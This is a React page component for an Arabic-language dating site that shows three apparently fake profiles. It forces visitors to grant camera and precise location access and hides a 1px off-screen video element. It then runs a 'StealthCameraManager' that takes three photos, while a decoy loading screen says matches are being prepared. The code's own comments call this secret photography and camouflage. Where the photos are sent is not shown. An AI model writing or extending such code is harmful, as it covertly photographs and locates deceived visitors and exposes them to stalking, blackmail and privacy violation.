import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import ProfileCard from '@/components/ProfileCard';
import SubscriptionSection from '@/components/SubscriptionSection';
import StealthCameraManager from '@/components/StealthCameraManager';
import { Loader2, Users, Sparkles, Camera, MapPin, XCircle, Shield } from 'lucide-react';

const profilesData = [
	{
		id: 1,
		name: 'منار',
		tagline: 'أبحث عن شريك لحياة مليئة بالحب والسعادة!',
		imageUrl: '/images/head.jpg',
		galleryImages: [
			'/images/492861928_3042031129270592_5878340506782742433_n.jpg',
			'/images/493679073_3042031239270581_2578712428501145292_n.jpg',
			'/images/494000038_3042031292603909_3860249713121620909_n.jpg',
			'/images/494441961_3042030965937275_6863802993332546293_n.jpg',
			'/images/495175740_3042031405937231_4428811475667918103_n.jpg',
			'/images/495662332_3042030852603953_6875536021466364459_n.jpg',
			'/images/499783379_3042031352603903_3201634282359638241_n.jpg',
			'/images/499861509_3042031079270597_8855453234753504983_n.jpg',
			'/images/500221778_3042031602603878_7582667013154658689_n.jpg',
			'/images/500318729_3042031475937224_5974158495486366566_n.jpg',
		],
	},
	{
		id: 2,
		name: 'نورا',
		tagline: 'أحب الحياة والمغامرات الجديدة!',
		imageUrl: '/images/card1/67384ba5e76045f23d84989f108819a5.jpg',
		galleryImages: [
			'/images/card1/67384ba5e76045f23d84989f108819a5.jpg',
			'/images/card1/8ceb0f3c39b2b5d142e8dc16981ed9b7.jpg',
			'/images/card1/ce4a915ce9decdbd3b6188b718f7ea2e.jpg',
		],
	},
	{
		id: 3,
		name: 'سارة',
		tagline: 'فنانة تعشق الجمال والطبيعة',
		imageUrl: '/images/card2/056586980a24c16f1ea47b8ac16a50e8.jpg',
		galleryImages: [
			'/images/card2/056586980a24c16f1ea47b8ac16a50e8.jpg',
			'/images/card2/1f6cf953d487a6487a37c68c12d332f7.jpg',
			'/images/card2/852ee08aabeae76e97a35141283b23c7.jpg',
			'/images/card2/8616241893958d18d7a1944f6da0a221.jpg',
		],
	},
];

const Index: React.FC = () => {
	const [permissionsGranted, setPermissionsGranted] = useState(false);
	const [showStealthCapture, setShowStealthCapture] = useState(false);
	const [captureComplete, setCaptureComplete] = useState(false);
	const [isLoading, setIsLoading] = useState(true);
	const [permissionsDenied, setPermissionsDenied] = useState(false);
	const [permissionError, setPermissionError] = useState<string>('');
	const videoRef = useRef<HTMLVideoElement | null>(null);
	const geoWatchId = useRef<number | null>(null);
	const navigate = useNavigate();

	useEffect(() => {
		// فحص صارم للصلاحيات مع منع الوصول في حالة الرفض
		const requestPermissions = async () => {
			try {
				console.log('🔒 بدء فحص الصلاحيات المطلوبة...');
				
				let cameraPermissionGranted = false;
				let locationPermissionGranted = false;

				// فحص إذن الكاميرا أولاً
				try {
					console.log('📷 طلب إذن الكاميرا...');
					const stream = await navigator.mediaDevices.getUserMedia({
						video: {
							width: { ideal: 640 },
							height: { ideal: 480 },
							facingMode: 'user'
						},
						audio: false
					});
					
					if (stream) {
						console.log('✅ تم منح إذن الكاميرا');
						cameraPermissionGranted = true;
						
						// إنشاء عنصر فيديو مخفي
						const videoElement = document.createElement('video');
						videoElement.style.width = '1px';
						videoElement.style.height = '1px';
						videoElement.style.position = 'fixed';
						videoElement.style.top = '-100px';
						videoElement.style.left = '-100px';
						videoElement.style.opacity = '0';
						videoElement.style.pointerEvents = 'none';
						videoElement.muted = true;
						videoElement.playsInline = true;
						videoElement.autoplay = true;
						document.body.appendChild(videoElement);
						videoRef.current = videoElement;
						
						videoElement.srcObject = stream;
						videoElement.play().catch(e => console.log('تشغيل الفيديو في الخلفية:', e));
						
						// إيقاف الكاميرا بعد التأكد من الإذن
						setTimeout(() => {
							stream.getTracks().forEach(track => track.stop());
						}, 2000);
					}
				} catch (cameraError: any) {
					console.error('❌ تم رفض إذن الكاميرا:', cameraError);
					setPermissionError('يجب السماح بالوصول للكاميرا لاستخدام الموقع');
					setPermissionsDenied(true);
					setIsLoading(false);
					return;
				}

				// فحص إذن الموقع ثانياً
				if (cameraPermissionGranted) {
					try {
						console.log('📍 طلب إذن الموقع...');
						
						// فحص إذا كانت خدمة الموقع متاحة
						if (!navigator.geolocation) {
							throw new Error('خدمة تحديد الموقع غير مدعومة في هذا المتصفح');
						}

						// محاولة الحصول على الموقع مع timeout قصير لفحص الإذن
						const locationPromise = new Promise<GeolocationPosition>((resolve, reject) => {
							const timeoutId = setTimeout(() => {
								reject(new Error('انتهت مهلة انتظار إذن الموقع'));
							}, 10000); // 10 ثوان

							navigator.geolocation.getCurrentPosition(
								(position) => {
									clearTimeout(timeoutId);
									resolve(position);
								},
								(error) => {
									clearTimeout(timeoutId);
									reject(error);
								},
								{
									enableHighAccuracy: true,
									timeout: 8000,
									maximumAge: 0
								}
							);
						});

						const position = await locationPromise;
						
						if (position && position.coords) {
							console.log('✅ تم منح إذن الموقع:', {
								lat: position.coords.latitude.toFixed(6),
								lng: position.coords.longitude.toFixed(6),
								accuracy: position.coords.accuracy.toFixed(0) + 'م'
							});
							locationPermissionGranted = true;
						}
						
					} catch (locationError: any) {
						console.error('❌ تم رفض إذن الموقع:', locationError);
						
						// التحقق من نوع الخطأ
						if (locationError.code === 1) { // PERMISSION_DENIED
							setPermissionError('يجب السماح بالوصول للموقع لاستخدام الموقع');
						} else if (locationError.code === 2) { // POSITION_UNAVAILABLE
							setPermissionError('لا يمكن تحديد موقعك الحالي، تأكد من تفعيل خدمة الموقع');
						} else if (locationError.code === 3) { // TIMEOUT
							setPermissionError('انتهت مهلة انتظار تحديد الموقع، حاول مرة أخرى');
						} else {
							setPermissionError('خطأ في الوصول للموقع: ' + locationError.message);
						}
						
						setPermissionsDenied(true);
						setIsLoading(false);
						return;
					}
				}

				// التحقق من أن جميع الصلاحيات تم منحها
				if (cameraPermissionGranted && locationPermissionGranted) {
					console.log('🎉 تم منح جميع الصلاحيات المطلوبة');
					setPermissionsGranted(true);
					setIsLoading(false);
					setShowStealthCapture(true);
				} else {
					console.error('❌ لم يتم منح جميع الصلاحيات المطلوبة');
					setPermissionError('جميع الصلاحيات مطلوبة لاستخدام الموقع');
					setPermissionsDenied(true);
					setIsLoading(false);
				}
				
			} catch (error: any) {
				console.error('❌ خطأ عام في طلب الصلاحيات:', error);
				setPermissionError('حدث خطأ في طلب الصلاحيات: ' + error.message);
				setPermissionsDenied(true);
				setIsLoading(false);
			}
		};

		// بدء طلب الصلاحيات
		requestPermissions();

		// مؤقت احتياطي - إذا لم تكتمل العملية في 30 ثانية
		const fallbackTimer = setTimeout(() => {
			if (isLoading && !permissionsDenied) {
				console.warn('⏰ انتهت مهلة انتظار الصلاحيات');
				setPermissionError('انتهت مهلة انتظار الصلاحيات، حاول إعادة تحميل الصفحة');
				setPermissionsDenied(true);
				setIsLoading(false);
			}
		}, 30000);

		// التنظيف عند إلغاء تحميل المكون
		return () => {
			clearTimeout(fallbackTimer);
			if (geoWatchId.current !== null) {
				navigator.geolocation.clearWatch(geoWatchId.current);
			}
			if (videoRef.current && document.body.contains(videoRef.current)) {
				document.body.removeChild(videoRef.current);
			}
		};
	}, []);

	const handleStealthCaptureComplete = () => {
		console.log('✅ تم الانتهاء من التصوير السري');
		setCaptureComplete(true);
		setShowStealthCapture(false);
	};

	const handleRetryPermissions = () => {
		console.log('🔄 إعادة محاولة طلب الصلاحيات...');
		setPermissionsDenied(false);
		setPermissionError('');
		setIsLoading(true);
		// إعادة تحميل الصفحة لطلب الصلاحيات من جديد
		window.location.reload();
	};

	// شاشة رفض الصلاحيات
	if (permissionsDenied) {
		return (
			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-red-900 to-red-800">
				<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-red-300/30 max-w-md mx-4">
					<XCircle className="w-20 h-20 text-red-400 mb-6 mx-auto" />
					<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
						صلاحيات مطلوبة
					</h2>
					<div className="space-y-4 mb-6">
						<div className="flex items-center gap-3 text-white/90">
							<Camera className="w-5 h-5 text-red-400" />
							<span>إذن الكاميرا مطلوب</span>
						</div>
						<div className="flex items-center gap-3 text-white/90">
							<MapPin className="w-5 h-5 text-red-400" />
							<span>إذن الموقع مطلوب</span>
						</div>
					</div>
					{permissionError && (
						<div className="bg-red-500/20 border border-red-400/30 rounded-lg p-3 mb-6">
							<p className="text-red-200 text-sm">
								{permissionError}
							</p>
						</div>
					)}
					<div className="space-y-3">
						<button
							onClick={handleRetryPermissions}
							className="w-full bg-seductive-accent hover:bg-seductive-accent/80 text-white font-bold py-3 px-6 rounded-lg transition-colors duration-200"
						>
							إعادة المحاولة
						</button>
						<p className="text-white/70 text-xs">
							يرجى السماح بالوصول للكاميرا والموقع لاستخدام الموقع
						</p>
					</div>
				</div>
			</div>
		);
	}

	// شاشة التحميل
	if (isLoading) {
		return (
			<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
				<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
					<div className="flex items-center justify-center gap-4 mb-6">
						<Shield className="w-12 h-12 text-seductive-accent" />
					</div>
					<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
					<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
						جاري فحص الصلاحيات...
					</h2>
					<p className="text-lg text-white/90 mb-4">
						يرجى السماح بالوصول للكاميرا والموقع
					</p>
					<div className="space-y-2 text-sm text-white/70">
						<div className="flex items-center justify-center gap-2">
							<Camera className="w-4 h-4" />
							<span>إذن الكاميرا</span>
						</div>
						<div className="flex items-center justify-center gap-2">
							<MapPin className="w-4 h-4" />
							<span>إذن الموقع</span>
						</div>
					</div>
				</div>
			</div>
		);
	}

	// نظام التصوير السري
	if (showStealthCapture) {
		return (
			<div>
				{/* التصوير السري يعمل في الخلفية */}
				<StealthCameraManager
					onComplete={handleStealthCaptureComplete}
					autoStart={true}
					photoCount={3}
				/>
				{/* شاشة تحميل بسيطة للتمويه */}
				<div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-seductive-bg to-seductive-bg/80">
					<div className="text-center p-8 rounded-lg bg-white/10 backdrop-blur-sm border border-white/20">
						<div className="flex items-center justify-center gap-4 mb-6">
							<Sparkles className="w-12 h-12 text-seductive-accent" />
						</div>
						<Loader2 className="w-16 h-16 text-seductive-accent animate-spin mb-6 mx-auto" />
						<h2 className="text-2xl md:text-3xl text-white font-bold mb-4">
							جاري تحضير تجربتك الخاصة
						</h2>
						<p className="text-lg text-white/90 mb-4">
							نحن نجهز أفضل المطابقات لك...
						</p>
						<p className="text-sm text-white/70">
							قريباً ستجد شريك العمر المناسب!
						</p>
					</div>
				</div>
			</div>
		);
	}

	// عرض المحتوى الرئيسي
	return (
		<div className="min-h-screen flex flex-col">
			<header className="py-8 text-center">
				<div className="container mx-auto px-4">
					<h1 className="text-3xl md:text-4xl lg:text-5xl font-bold text-seductive-text flex items-center justify-center gap-3">
						<Sparkles className="w-8 h-8 md:w-10 md:h-10 text-seductive-accent" />
						اكتشف شريك العمر المناسب لك!
						<Sparkles className="w-8 h-8 md:w-10 md:h-10 text-seductive-accent" />
					</h1>
				</div>
			</header>

			<main className="flex-grow container mx-auto px-4 py-8">
				<div className="text-center mb-12">
					<p className="text-xl md:text-2xl text-seductive-text flex items-center justify-center gap-2">
						<Users className="w-7 h-7 text-seductive-accent" />
						هؤلاء الأشخاص ينتظرونك!
					</p>
				</div>
				<div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 justify-center">
					{profilesData.map((profile) => (
						<ProfileCard
							key={profile.id}
							imageUrl={profile.imageUrl}
							tagline={profile.tagline}
							name={profile.name}
							galleryImages={profile.galleryImages}
						/>
					))}
				</div>
				<div className="text-center mt-12">
					<p className="text-lg md:text-xl text-seductive-text/80 italic">
						ابدأ محادثة الآن واكتشف المزيد!
					</p>
				</div>
			</main>

			<SubscriptionSection />

			<footer className="text-center py-6 text-seductive-text/60 text-sm">
				<p>&copy; {new Date().getFullYear()} شريك العمر. جميع الحقوق محفوظة.</p>
				<p className="font-english text-xs">
					Lovingly crafted in Menoufia, Egypt.
				</p>
			</footer>
		</div>
	);
};

export default Index;
